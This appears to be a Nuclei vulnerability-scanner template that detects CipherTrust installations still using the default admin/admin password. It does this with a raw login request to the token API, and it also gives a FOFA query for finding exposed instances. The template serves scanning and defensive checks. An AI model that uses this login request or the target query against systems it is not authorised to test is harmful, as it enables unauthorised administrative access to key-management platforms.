id: ciphertrust-default-password-vulnerability

info:
  name: Ciphertrust default password vulnerability
  author: SleepingBag945
  severity: medium
  description: |
    Attackers can control the entire platform through the default password （initpass） vulnerability, and use administrator privileges to operate core functions.<br>
  metadata:
    fofa-query: cert="Ciphertrust" || fid="yHV5+ZZGMu0="
  tags: default Password

http:
  - raw:
      - |
        POST /api/v1/auth/tokens/  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"admin","connection":"local_account","password":"admin","grant_type":"password","refresh_token_revoke_unused_in":30,"cookies":true,"labels":["web-ui"]}


    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 401 && contains(body_1,"code") && contains(body_1,"Password change required")'
        condition: and
